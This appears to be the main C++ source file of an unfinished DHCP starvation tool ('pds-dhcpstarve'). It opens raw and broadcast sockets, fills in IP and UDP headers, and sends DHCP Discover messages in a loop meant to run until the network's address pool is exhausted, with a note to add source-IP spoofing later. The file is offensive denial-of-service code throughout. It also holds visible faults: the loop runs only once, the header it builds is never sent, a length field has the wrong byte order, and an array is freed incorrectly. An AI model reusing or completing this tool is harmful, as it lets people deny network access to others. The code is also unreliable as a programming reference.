#include "include/pds-dhcpstarve.h"
#include "include/pds-dhcpCore.h"
#include "include/pds-RawSocketHelper.h"



// 12 bytes pseudo header for udp checksum calculation
struct pseudoUDPHeader
{
	uint32_t source_address;
	uint32_t dest_address;
	uint8_t placeholder;
	uint8_t protocol;
	uint16_t udp_length;
};

// checksum calculation function
unsigned short csum(unsigned short *ptr, int nbytes)
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum = 0;
	while (nbytes>1) {
		sum += *ptr++;
		nbytes -= 2;
	}
	if (nbytes == 1) {
		oddbyte = 0;
		*((u_char*)&oddbyte) = *(u_char*)ptr;
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);
	answer = (short)~sum;

	return(answer);
}


int main(int argc, char* argv[])
{
	// parse the parameters using getopt
	std::string chosenInterface = "";
	int c;
	bool errorFlag = false;

	if (argc != 3) {
		std::cerr << "Incorrect number of params, exiting program." << std::endl;
		return INCORRECT_PARAMS;
	}

	while ((c = getopt(argc, argv, "i:")) != -1) {
		switch (c) {
		case 'i':
			chosenInterface = optarg;
			break;
		case ':':
			std::cerr << "Option -" << optopt << "requires an operand" << std::endl;
			errorFlag = true;
			break;
		case '?':
			std::cerr << "Unrecognized option: " << optopt << std::endl;
			errorFlag = true;
			break;
		}
	}

	if (errorFlag || chosenInterface.empty()) {
		std::cerr << "Incorrect params, exiting program." << std::endl;
		return INCORRECT_PARAMS;
	}

	std::cout << "Interface: " << chosenInterface << std::endl;

	// create instance of dhcp starve core class
	DHCPCore* dhcpCoreInstance = new DHCPCore();
	dhcpCoreInstance->getDeviceIPAddressNetMask(chosenInterface);
	if (dhcpCoreInstance->isError())
	{
		// error occured tidy up and exit
		delete(dhcpCoreInstance);
		exit(1);
	}

	// SOCKET FOR SENDING --------------------------------------------------------------------
	// create socket and send message 
	int senderSocket = 0;
	/*if ((senderSocket = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
	{
		fprintf(stderr, "Cannot create socket.");
		delete(dhcpCoreInstance);
		exit(1);
	}

	struct sockaddr_in interfaceSettings;
	struct sockaddr_in serverSettings;
	// set parameter and bind to socket to specific interface
	interfaceSettings.sin_family = AF_INET;
	interfaceSettings.sin_addr = dhcpCoreInstance->getDeviceIP();
	interfaceSettings.sin_port = htons(DHCP_CLIENT_PORT);
	if (bind(senderSocket, (sockaddr*)&interfaceSettings, sizeof(interfaceSettings)) < 0)
	{ // cannot bind socket to given address and port
		fprintf(stderr, "Cannot bind socket to interface: %s.", chosenInterface.c_str());
		printf("Oh dear, something went wrong with read()! %s\n", strerror(errno));
		delete(dhcpCoreInstance);
		exit(1);
	}
	// set parameters for server address and connect socket to it
	serverSettings.sin_family = AF_INET;
	serverSettings.sin_port = htons(DHCP_SERVER_PORT);
	// set IPv4 broadcast
	if ((inet_pton(AF_INET, DHCP_SERVER_ADDRESS, &serverSettings.sin_addr)) <= 0)
	{
		fprintf(stderr, "Cannot set server address (%s) -> inet_pton error.", DHCP_SERVER_ADDRESS);
		delete(dhcpCoreInstance);
		exit(1);
	}
	// connect socket
	if (connect(senderSocket, (struct sockaddr *)&serverSettings, sizeof(serverSettings)) < 0)
	{
		fprintf(stderr, "Cannot connect socket to address.");
		delete(dhcpCoreInstance);
		exit(1);
	}*/

	if ((senderSocket = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0)
	{
		fprintf(stderr, "Cannot create socket.");
		delete(dhcpCoreInstance);
		exit(1);
	}
	
	// create array for packet and init it
	char datagram[ETHERNET_MTU];
	memset(datagram, 0, ETHERNET_MTU);
	// pseudoheader for checksum
	struct pseudoUDPHeader psh;
	// ip header
	struct ip *iph = (struct ip *) datagram;
	// udp header - pointer after ip header (struct ip defined in <netinet/ip.h>)
	struct udphdr  *udph = (struct udphdr *) (datagram + sizeof(struct ip));
	// datapart pointer, after ip and udp header
	char * dataPointer = datagram + (sizeof(struct ip) + sizeof(struct udphdr));

	// bind our socket to interface and port
	struct sockaddr_in interfaceSettings;
	interfaceSettings.sin_family = AF_INET;
	interfaceSettings.sin_addr = dhcpCoreInstance->getDeviceIP();
	interfaceSettings.sin_port = htons(DHCP_CLIENT_PORT);
	if (bind(senderSocket, (sockaddr*)&interfaceSettings, sizeof(interfaceSettings)) < 0)
	{ // cannot bind socket to given address and port
		fprintf(stderr, "Cannot bind socket to interface: %s.", chosenInterface.c_str());
		printf("Oh dear, something went wrong with read()! %s\n", strerror(errno));
		delete(dhcpCoreInstance);
		exit(1);
	}

	// fill datagram with correct values
	// ip header
	iph->ip_hl = 5;
	iph->ip_v = 4;
	iph->ip_tos = 0;
	iph->ip_len = sizeof(struct iphdr) + sizeof(struct udphdr); // no data for now
	iph->ip_id = htonl(54321);							 //Id of this packet
	iph->ip_off = 0;
	iph->ip_ttl = 255;
	iph->ip_p = IPPROTO_UDP;
	iph->ip_sum = 0;								     //Set to 0 before calculating checksum
	iph->ip_src = dhcpCoreInstance->getDeviceIP();       //TO-DO: Spoof the source ip address.
	if ((inet_pton(AF_INET, DHCP_SERVER_ADDRESS, &(iph->ip_dst))) <= 0)
	{
		fprintf(stderr, "Cannot set server address (%s) -> inet_pton error.", DHCP_SERVER_ADDRESS);
		delete(dhcpCoreInstance);
		exit(1);
	}
	// udp header
	udph->uh_sport = htons(DHCP_CLIENT_PORT);
	udph->uh_dport = htons(DHCP_SERVER_PORT);
	udph->uh_ulen = htons(sizeof(struct udphdr)); // no data for now
	udph->uh_sum = 0;
	// udp pseudoheader for checksum
	psh.source_address = iph->ip_src.s_addr;
	psh.dest_address = iph->ip_dst.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_UDP;
	psh.udp_length = udph->uh_ulen;

	// BEFORE SENDIND - create socket to catch response on Broadcast -------------------------------------------
	int receiverSocket = 0;
	if ((receiverSocket = socket(AF_INET, SOCK_DGRAM, 0)) < 0)
	{
		fprintf(stderr, "Cannot create socket for receiving broadcast response.");
		delete(dhcpCoreInstance);
		exit(1);
	}
	int broadcast = 1;
	if (setsockopt(receiverSocket, SOL_SOCKET, SO_BROADCAST, &broadcast, sizeof(broadcast)) < 0)
	{
		fprintf(stderr, "Cannot set broadcast to socket.");
		delete(dhcpCoreInstance);
		exit(1);
	}

	struct sockaddr_in receivingAddress;
	memset(&receivingAddress, 0, sizeof receivingAddress);
	receivingAddress.sin_addr.s_addr = htonl(INADDR_ANY); // broadcast
	receivingAddress.sin_family = AF_INET;
	receivingAddress.sin_port = htons(DHCP_SERVER_PORT);

	// connect socket
	if (bind(receiverSocket, (struct sockaddr *)&receivingAddress, sizeof(receivingAddress)) < 0)
	{
		fprintf(stderr, "Cannot connect socket to address.");
		delete(dhcpCoreInstance);
		exit(1);
	}

	// create buffer to catch the respons, TO-DO: MAYBE CATCH USING BUFFER IN DHCP CORE ------------------------
	char *response = 0;
	response = new char[ETHERNET_MTU];
	// address of dhcp server -> filled together with response
	sockaddr_in si_other;
	unsigned slen = sizeof(sockaddr);

	int i = 0;
	while (i < 1) // repeate until pool dried out
	{
		// init buffer for response
		std::fill_n(response, ETHERNET_MTU, 0);

		// create DHCP Discover message
		dhcpCoreInstance->createDHCPDiscoverMessage();
		if (dhcpCoreInstance->isError())
		{
			// error occured tidy up and exit
			delete(dhcpCoreInstance);
			exit(1);
		}

		// send message
		send(senderSocket, dhcpCoreInstance->getMessage(), dhcpCoreInstance->getSizeOfMessage(), 0);

		// get the response -> is blocking if no response, the code will get stack
		// TO-DO: Check what happend if pool is dried out
		//int receivedSize = recvfrom(receiverSocket, response, ETHERNET_MTU, 0, (sockaddr *)&si_other, &slen);
		int receivedSize = recvfrom(receiverSocket, response, ETHERNET_MTU, 0, (sockaddr *)&si_other, &slen);
		printf("recv: %d | %s\n", receivedSize, response);
		struct sockaddr_in *s = (struct sockaddr_in *)&si_other;
		int port = ntohs(s->sin_port);
		char ipstr[INET_ADDRSTRLEN];
		inet_ntop(AF_INET, &s->sin_addr, ipstr, sizeof ipstr);
		printf("address: %s , port: %d\n", ipstr, port);

		// load response to dhcp_packet struct
		dhcpCoreInstance->ProcessDHCPOfferMessage(response, receivedSize);
		if (dhcpCoreInstance->isError())
		{
			// error occured tidy up and exit
			delete(dhcpCoreInstance);
			exit(1);
		}

		i++;
	}
	// free the array for response
	delete(response);

	/*int readedBytes = recv(receiverSocket, &response, sizeof(response) - 1200, 0);
	std::cout << "Readed Bytes: " << readedBytes << std::endl;*/

	delete(dhcpCoreInstance);
	exit(0);
}
